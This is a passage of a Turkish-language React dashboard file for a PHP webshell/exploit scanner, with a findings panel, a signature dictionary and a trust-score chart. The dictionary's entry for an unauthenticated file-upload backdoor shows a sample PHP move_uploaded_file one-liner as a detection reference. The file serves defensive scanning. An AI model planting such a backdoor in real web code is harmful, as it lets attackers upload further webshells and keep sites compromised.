    name: "Dosya Yükleme Backdoor'u",
    what: "move_uploaded_file ile herhangi bir dosya yükleme (auth yok)",
    danger: "İkinci webshell yüklenmesi için köprü — sürekli enfeksiyon",
    example: "move_uploaded_file($_FILES['f']['tmp_name'], $_GET['dst']);",
    fix: "SİLİN. Web'in tüm upload dizinlerini denetleyin.",
  },
};

function ExploitPanel({ latest, findings, runScan, dismiss, expandedFinding, setExpandedFinding }) {
  const [filter, setFilter] = useState("all");
  const [search, setSearch] = useState("");
  const filtered = findings.filter((f) => {
    if (filter !== "all" && f.severity !== filter) return false;
    if (search && !`${f.file_path} ${f.signature} ${f.snippet || ""}`.toLowerCase().includes(search.toLowerCase())) return false;
    return true;
  });
  const bySeverity = {
    critical: findings.filter((f) => f.severity === "critical").length,
    high: findings.filter((f) => f.severity === "high").length,
    medium: findings.filter((f) => f.severity === "medium").length,
    low: findings.filter((f) => f.severity === "low").length,
  };
  return (
    <>
      {/* Hero */}
      <div className="rounded-xl border border-rose-500/30 bg-gradient-to-br from-rose-500/10 via-slate-900 to-slate-950 p-6" data-testid="exploit-hero">
        <div className="flex items-start justify-between gap-4 flex-wrap">
          <div>
            <div className="text-xs uppercase tracking-widest text-rose-300 mono mb-1 flex items-center gap-2">
              <Bug className="w-4 h-4"/> WebShell / Exploit Tarayıcı
            </div>
            <h2 className="text-2xl font-bold text-slate-100">
              <span className="text-rose-300">{findings.length}</span> aktif bulgu · <span className="text-slate-400">10 imza taranıyor</span>
            </h2>
            <p className="text-xs text-slate-400 mt-1">
              /var/www altındaki PHP dosyalarında webshell, backdoor, RCE ve obfuscation kalıpları
            </p>
          </div>
          <button data-testid="run-exploit-scan" disabled={runScan.isPending} onClick={() => runScan.mutate()}
                  className="text-sm px-4 py-2 rounded-lg bg-gradient-to-br from-rose-500 to-orange-600 text-white shadow-lg shadow-rose-500/25 hover:shadow-rose-500/40 disabled:opacity-40 inline-flex items-center gap-2">
            <Play className="w-4 h-4"/> {runScan.isPending ? "Taranıyor…" : "Yeni Tarama Başlat"}
          </button>
        </div>
        <div className="grid grid-cols-2 md:grid-cols-5 gap-2 mt-6">
          <div className="bg-slate-900/60 rounded-lg p-3 border border-slate-800">
            <div className="text-[10px] uppercase tracking-widest text-slate-500">Son Tarama</div>
            <div className="text-sm mono text-slate-300 mt-1">{(latest?.created_at || "-").slice(0, 16).replace("T", " ")}</div>
          </div>
          <TCTile icon={AlertTriangle} label="Kritik" value={bySeverity.critical} tone="rose"/>
          <TCTile icon={AlertTriangle} label="Yüksek" value={bySeverity.high} tone="amber"/>
          <TCTile icon={AlertTriangle} label="Orta" value={bySeverity.medium} tone="indigo"/>
          <TCTile icon={AlertTriangle} label="Toplam Dosya" value={latest?.scanned_files ?? 0} tone="slate"/>
        </div>
      </div>

      {/* Search + filter */}
      <div className="flex gap-2 flex-wrap items-center">
        <input
          value={search} onChange={(e) => setSearch(e.target.value)}
          placeholder="Dosya adı, imza veya kod içeriği ara..."
          data-testid="exploit-search"
          className="flex-1 min-w-[240px] px-3 py-2 bg-slate-950 border border-slate-800 rounded text-sm text-slate-100 focus:outline-none focus:border-rose-500"
        />
        <div className="flex gap-1 bg-slate-900 rounded p-1">
          {["all", "critical", "high", "medium", "low"].map((s) => (
            <button key={s} onClick={() => setFilter(s)}
                    data-testid={`exploit-filter-${s}`}
                    className={`text-xs px-3 py-1 rounded ${
                      filter === s
                        ? s === "critical" ? "bg-rose-500/20 text-rose-200"
                        : s === "high" ? "bg-amber-500/20 text-amber-200"
                        : s === "medium" ? "bg-indigo-500/20 text-indigo-200"
                        : s === "low" ? "bg-slate-700 text-slate-200"
                        : "bg-slate-700 text-slate-100"
                      : "text-slate-500 hover:text-slate-100"
                    }`}>
              {{all: "Tümü", critical: "Kritik", high: "Yüksek", medium: "Orta", low: "Düşük"}[s]}
              <span className="ml-1 text-[10px] opacity-70">
                {s === "all" ? findings.length : bySeverity[s] || 0}
              </span>
            </button>
          ))}
        </div>
      </div>

      {/* Findings list */}
      <div className="space-y-2">
        {filtered.length === 0 && (
          <div className="text-center py-16 border border-slate-800 rounded-lg bg-slate-900/30">
            <ShieldCheck className="w-16 h-16 text-emerald-500/60 mx-auto mb-3"/>
            <div className="text-lg text-emerald-300 font-semibold">
              {findings.length === 0 ? "Sistem Temiz" : "Filtreye Uyan Bulgu Yok"}
            </div>
            <div className="text-xs text-slate-500 mt-1">
              {findings.length === 0 ? "10 imzanın hiçbiri tetiklenmedi" : "Filtreyi değiştirin"}
            </div>
          </div>
        )}
        {filtered.map((f) => {
          const isOpen = expandedFinding === f.id;
          const sig = SIGNATURE_DICT[f.signature] || {};
          return (
            <div key={f.id} data-testid={`finding-${f.id}`}
                 className={`border-l-4 rounded-lg overflow-hidden bg-slate-900/40 border ${
                   f.severity === "critical" ? "border-l-rose-500 border-rose-500/20" :
                   f.severity === "high"     ? "border-l-amber-500 border-amber-500/20" :
                   f.severity === "medium"   ? "border-l-indigo-500 border-indigo-500/20"
                                             : "border-l-slate-500 border-slate-800"
                 }`}>
              <div className="p-3 flex items-start gap-3 cursor-pointer"
                   onClick={() => setExpandedFinding(isOpen ? null : f.id)}>
                <div className={`p-2 rounded shrink-0 ${
                  f.severity === "critical" ? "bg-rose-500/20"
                  : f.severity === "high" ? "bg-amber-500/20"
                  : "bg-slate-800"
                }`}>
                  <AlertTriangle className={`w-4 h-4 ${
                    f.severity === "critical" ? "text-rose-400" :
                    f.severity === "high" ? "text-amber-400" :
                    "text-slate-400"}`}/>
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 flex-wrap mb-1">
                    <Badge tone={f.severity === "critical" ? "danger" : f.severity === "high" ? "warning" : "default"}>
                      {f.severity.toUpperCase()}
                    </Badge>
                    <span className="text-slate-100 font-semibold text-sm">{sig.name || f.signature}</span>
                    <span className="text-[10px] text-slate-500 mono">· {f.category}</span>
                    <span className="text-[10px] text-slate-500 ml-auto">{isOpen ? "▲ kapat" : "▼ ne demek?"}</span>
                  </div>
                  <div className="text-[11px] mono text-indigo-300 truncate">
                    📄 {f.file_path}:{f.line}
                  </div>
                  {!isOpen && sig.what && (
                    <div className="text-[11px] text-slate-400 mt-1 line-clamp-1">{sig.what}</div>
                  )}
                </div>
                <button onClick={(e) => { e.stopPropagation(); dismiss.mutate(f.id); }}
                        title="Bulguyu kapat"
                        data-testid={`dismiss-${f.id}`}
                        className="text-slate-500 hover:text-rose-400 shrink-0">
                  <XCircle className="w-4 h-4"/>
                </button>
              </div>
              {isOpen && (
                <div className="border-t border-slate-800 bg-slate-950/80 p-4 space-y-4">
                  {/* Ne demek? */}
                  {sig.what && (
                    <div className="bg-slate-900/60 border border-slate-800 rounded-lg p-3">
                      <div className="text-[10px] uppercase tracking-widest text-indigo-400 mb-1">🔍 Bu Ne Anlama Geliyor?</div>
                      <div className="text-sm text-slate-100">{sig.what}</div>
                    </div>
                  )}
                  {/* Tehlike */}
                  {sig.danger && (
                    <div className="bg-rose-500/10 border border-rose-500/30 rounded-lg p-3">
                      <div className="text-[10px] uppercase tracking-widest text-rose-300 mb-1">🚨 Tehlike Nedir?</div>
                      <div className="text-sm text-rose-100">{sig.danger}</div>
                    </div>
                  )}
                  {/* Kod örneği + tespit */}
                  <div>
                    <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">💻 Tespit Edilen Kod</div>
                    <pre className="text-[11px] mono text-rose-300 bg-black border border-rose-500/20 rounded p-3 overflow-x-auto whitespace-pre-wrap">
{f.snippet || sig.example || "(kod önizlemesi yok)"}</pre>
                  </div>
                  {/* Nasıl çözerim? */}
                  {sig.fix && (
                    <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-lg p-3">
                      <div className="text-[10px] uppercase tracking-widest text-emerald-300 mb-1">✅ Nasıl Çözerim?</div>
                      <div className="text-sm text-emerald-100">{sig.fix}</div>
                    </div>
                  )}
                  {/* Meta */}
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs pt-2 border-t border-slate-800">
                    <div><span className="text-slate-500">İmza: </span><span className="mono text-slate-300">{f.signature}</span></div>
                    <div><span className="text-slate-500">Satır: </span><span className="mono text-slate-300">{f.line}</span></div>
                    <div><span className="text-slate-500">Kategori: </span><span className="mono text-slate-300">{f.category}</span></div>
                    <div><span className="text-slate-500">Tespit: </span><span className="mono text-slate-300">{(f.created_at || "").slice(0, 16).replace("T", " ")}</span></div>
                  </div>
                  {/* Aksiyon linkleri */}
                  <div className="flex gap-2 flex-wrap pt-2 border-t border-slate-800">
                    <a href={`https://owasp.org/www-community/attacks/${encodeURIComponent(f.category || "")}`}
                       target="_blank" rel="noopener noreferrer"
                       className="text-[11px] px-3 py-1.5 rounded bg-indigo-500/15 text-indigo-200 border border-indigo-500/40 hover:bg-indigo-500/25 inline-flex items-center gap-1">
                      📖 OWASP Dokümanı
                    </a>
                    <a href={`https://www.google.com/search?q=${encodeURIComponent((sig.name || f.signature) + " php webshell how to remove")}`}
                       target="_blank" rel="noopener noreferrer"
                       className="text-[11px] px-3 py-1.5 rounded bg-slate-800 text-slate-300 hover:bg-slate-700 inline-flex items-center gap-1">
                      🔎 Web'de Ara
                    </a>
                    <button onClick={() => dismiss.mutate(f.id)}
                            className="text-[11px] px-3 py-1.5 rounded bg-emerald-500/15 text-emerald-200 border border-emerald-500/40 hover:bg-emerald-500/25 inline-flex items-center gap-1 ml-auto">
                      ✓ Çözüldü olarak işaretle
                    </button>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </div>

      <ModuleFooter
        title="10 İmza · Ne Tarar? Ne Bulur?"
        howItWorks="/var/www altındaki tüm PHP dosyaları düzenli aralıklarla (30 dk) taranır. Her imza için özel bir regex ve kod pattern'i tanımlıdır. Bulgular kategorize edilir: webshell / backdoor / rce / obfuscation / downloader / uploader."
        technical={Object.entries(SIGNATURE_DICT).slice(0, 6).map(([k, v]) =>
          `${k}: ${v.name}`
        )}
        recommendations={[
          "Kritik bulguyu 24 saat içinde çöz (webshell = tam sistem ele geçirme)",
          "Bulguyu 'Çözüldü' olarak işaretle → tekrar tarama sırasında görmezden gelinir",
          "Dosyayı silmeden önce mutlaka git log/access log'a bak (kim yüklemiş?)",
          "Sürekli enfeksiyon varsa WHM tüm siteler + FTP şifrelerini değiştir",
        ]}
      />
    </>
  );
}

/* ---------------- Trust Trend Chart ---------------- */

function TrustTrendChart({ history, currentScore }) {
  const series = history?.series || [];
  // Boş serileri düşür ama x eksenini koru
  const hasData = series.some((s) => s.score !== null);
  const delta = history?.delta;
  const avg = history?.avg;
  const min = history?.min;
  const max = history?.max;

  // SVG boyutları
  const W = 900, H = 140, PAD_L = 40, PAD_R = 10, PAD_T = 15, PAD_B = 25;
  const chartW = W - PAD_L - PAD_R, chartH = H - PAD_T - PAD_B;
  const scoreToY = (s) => PAD_T + chartH - (s / 100) * chartH;
  const iToX = (i) => PAD_L + (series.length > 1 ? (i / (series.length - 1)) * chartW : chartW / 2);

  // Path
  const points = series
    .map((s, i) => (s.score !== null ? `${iToX(i).toFixed(1)},${scoreToY(s.score).toFixed(1)}` : null))
    .filter(Boolean);
  const pathD = points.length > 0 ? "M " + points.join(" L ") : "";
  const areaD = points.length > 0
    ? `M ${points[0]} L ${points.join(" L ")} L ${iToX(series.length - 1).toFixed(1)},${PAD_T + chartH} L ${PAD_L},${PAD_T + chartH} Z`
    : "";

  const trendUp = (delta || 0) > 0;
  const trendDown = (delta || 0) < 0;

  return (
    <Card>
      <CardHeader
        title={<span className="flex items-center gap-2">
          <TrendingUp className="w-4 h-4 text-indigo-400"/> Güven Skoru Trendi · Son 30 Gün
        </span>}
        subtitle="Her dashboard ziyaretinde günlük skor kaydedilir. Zaman içinde nasıl geliştiğini gözlemleyin."
      />
      <CardBody className="space-y-3">
        {/* Delta strip */}
        <div className="flex gap-4 items-center text-xs">
          <div>
            <div className="text-[10px] uppercase tracking-widest text-slate-500">Bugün</div>
            <div className="text-lg font-bold mono text-slate-100" data-testid="trend-current">{currentScore}</div>
          </div>
          <div>
            <div className="text-[10px] uppercase tracking-widest text-slate-500">30G Ort.</div>
            <div className="text-lg font-bold mono text-slate-300">{avg ?? "-"}</div>
          </div>
          <div>
            <div className="text-[10px] uppercase tracking-widest text-slate-500">Min · Max</div>
            <div className="text-lg font-bold mono text-slate-300">
              {min ?? "-"} <span className="text-slate-600">·</span> {max ?? "-"}
            </div>
          </div>
          <div className="ml-auto">
            {delta === null || delta === undefined ? (
              <span className="text-xs text-slate-500">yeterli veri yok</span>
            ) : delta === 0 ? (
              <span className="text-xs text-slate-400 inline-flex items-center gap-1">→ değişiklik yok</span>
            ) : (
              <span className={`text-xs inline-flex items-center gap-1 font-semibold ${trendUp ? "text-emerald-400" : "text-rose-400"}`}
                    data-testid="trend-delta">
                {trendUp ? <TrendingUp className="w-3.5 h-3.5"/> : <TrendingDown className="w-3.5 h-3.5"/>}
                {trendUp ? "+" : ""}{delta} puan · {trendUp ? "iyileşiyor" : "gerilledi"}
              </span>
            )}
          </div>
        </div>

        {/* SVG chart */}
        <div className="bg-slate-950 rounded-lg border border-slate-800 p-2">
          <svg viewBox={`0 0 ${W} ${H}`} className="w-full h-auto" data-testid="trend-chart">
            {/* Grid lines */}
            {[0, 25, 50, 75, 100].map((v) => (
              <g key={v}>
                <line x1={PAD_L} x2={W - PAD_R} y1={scoreToY(v)} y2={scoreToY(v)}
                      stroke={v === 60 ? "#f59e0b40" : v === 85 ? "#10b98140" : "#1e293b"} strokeWidth="0.5"
                      strokeDasharray={v === 60 || v === 85 ? "3 3" : "0"}/>
                <text x={PAD_L - 6} y={scoreToY(v) + 3} textAnchor="end" fill="#64748b" fontSize="9">{v}</text>
              </g>
            ))}
            {/* Threshold bands (subtle) */}
            <rect x={PAD_L} y={scoreToY(100)} width={chartW} height={scoreToY(85) - scoreToY(100)}
                  fill="#10b981" opacity="0.03"/>
            <rect x={PAD_L} y={scoreToY(60)} width={chartW} height={scoreToY(0) - scoreToY(60)}
                  fill="#f43f5e" opacity="0.03"/>
            {/* Area + line */}
            {hasData && (
              <>
                <defs>
                  <linearGradient id="trustGrad" x1="0" x2="0" y1="0" y2="1">
                    <stop offset="0%" stopColor="#6366f1" stopOpacity="0.6"/>
                    <stop offset="100%" stopColor="#6366f1" stopOpacity="0"/>
                  </linearGradient>
                </defs>
                <path d={areaD} fill="url(#trustGrad)"/>
                <path d={pathD} fill="none" stroke="#818cf8" strokeWidth="2"/>
                {series.map((s, i) => s.score !== null && (
                  <circle key={i} cx={iToX(i)} cy={scoreToY(s.score)} r="2.5" fill="#818cf8">
                    <title>{s.date}: {s.score}</title>
                  </circle>
                ))}
              </>
            )}
            {!hasData && (
              <text x={W / 2} y={H / 2} textAnchor="middle" fill="#475569" fontSize="12">
                Henüz veri yok — dashboard'ı birkaç gün ziyaret edin
              </text>
            )}
            {/* X-axis labels (start, mid, end) */}
            {series.length > 0 && [0, Math.floor(series.length / 2), series.length - 1].map((i) => (
              <text key={i} x={iToX(i)} y={H - 8} textAnchor="middle" fill="#64748b" fontSize="9">
                {series[i]?.date.slice(5)}
              </text>
            ))}
          </svg>
        </div>
      </CardBody>
    </Card>
  );
}
